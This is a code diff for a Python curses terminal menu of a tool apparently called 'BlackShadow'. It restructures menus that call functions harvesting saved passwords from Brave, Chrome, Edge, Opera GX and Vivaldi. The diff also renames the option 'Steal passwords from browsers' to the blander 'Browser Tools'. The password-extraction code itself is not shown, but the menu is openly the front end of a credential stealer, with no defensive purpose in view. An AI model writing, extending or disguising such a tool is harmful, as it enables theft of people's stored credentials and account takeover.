@@ -34,8 +34,8 @@ def showLogo(screen):
     logo = r"""
      ⠀⠀⠀⢀⣴⣿⣿⣿⣦
      ⠀⠀⣰⣿⡟⢻⣿⡟⢻⣧        ____  __           __   _____ __              __              
-    ⠀⠀⣰⣿⣿⣇⣸⣿⣇⣸⣿       / __ )/ /___ ______/ /__/ ___// /_  ____ _____/ /_____      __
-    ⠀⣴⣿⣿⣿⣿⠟⢻⣿⣿⣿      / __  / / __ `/ ___/ //_/\__ \/ __ \/ __ `/ __  / __ \ | /| / /
+    ⠀⠀⣰⣿⣿⣇⣸⣿⣇⣸⣿       / __ )/ /___  _____/ /__/ ___// /_  ____  ____/ /_____      __
+    ⠀⣴⣿⣿⣿⣿⠟⢻⣿⣿⣿      / __  / / __ \/ ___/ //_/\__ \/ __ \/ __ \/ __  / __ \ | /| / /
    ⣠⣾⣿⣿⣿⣿⣿⣤⣼⣿⣿⡇     / /_/ / / /_/ / /__/ , < ___/ / / / / /_/ / /_/ / /_/ / |/ |/ / 
    ⢿⡿⢿⣿⣿⣿⣿⣿⣿⣿⡿⠀    /_____/_/\__,__\___/_/|_|/____/_/ /_/\__,__\__,_/\____/|__/|__/  
    ⠀⠀⠀⠈⠿⠿⠋⠙⠿⠛⠁
@@ -72,7 +72,7 @@ def handleInput(key, currentOption, options):
     return None, currentOption
 def mainMenuControl():
     options = [
-        ("1", "Steal passwords from browsers"),
+        ("1", "Browser Tools"),
         ("0", "Exit")
     ]
     currentOption = 0
@@ -88,7 +88,25 @@ def mainMenuControl():
     curses.wrapper(menuLogic)
     return selectedOption
 
-def submenuBrowsers():
+def subMenuBrowsers():
+    options = [
+        ("1", "Passwords"),
+        ("0", "Back")
+    ]
+    currentOption = 0
+    selectedOption = None
+
+    def menuLogic(screen):
+        nonlocal selectedOption, currentOption
+        while selectedOption is None:
+            displayMenu(screen, options, currentOption, "TOOLS")
+            key = screen.getch()
+            selectedOption, currentOption = handleInput(key, currentOption, options)
+
+    curses.wrapper(menuLogic)
+    return selectedOption
+
+def subOptionsBrowsers():
     options = [
         ("1", "Brave"),
         ("2", "Google Chrome"),
@@ -110,35 +128,32 @@ def submenuBrowsers():
     return selectedOption
 
 def main():
-    browser_functions = {
-        '1': getPasswordsBrave,
-        '2': getPasswordsChrome,
-        '3': getPasswordsEdge,
-        '4': getPasswordsOperaGX,
-        '5': getPasswordsVivaldi
-    }
-
     while True:
         choice = mainMenuControl()
+        # Browsers
         if choice == '1':
-            while True:
-                subchoice = submenuBrowsers()
-                if subchoice == '0':
-                    break
-
-                func = browser_functions.get(subchoice)
-                if func:
-                    try:
-                        func()
-                    except Exception as e:
-                        print(f"{RED}Ocorreu um erro: {e}{RESET}")
-                else:
-                    print(f"{RED}Opção inválida!{RESET}")
-
-                input("Press Enter to continue...")
-                os.system('cls' if os.name == 'nt' else 'clear')
+            subChoice = subMenuBrowsers()
+            # Passwords
+            if subChoice == '1':
+                subOption = subOptionsBrowsers()
+                browserFunctions = {
+                    '1': getPasswordsBrave,
+                    '2': getPasswordsChrome,
+                    '3': getPasswordsEdge,
+                    '4': getPasswordsOperaGX,
+                    '5': getPasswordsVivaldi
+                }
+                if subOption in browserFunctions:
+                    browserFunctions[subOption]()
+                elif subOption == '0':
+                    continue
+            # Back
+            elif subChoice == '0':
+                continue
+        # Exit
         elif choice == '0':
-            exit()
+            os.system('cls' if os.name == 'nt' else 'clear')
+            break
 
 if __name__ == "__main__":
     main()
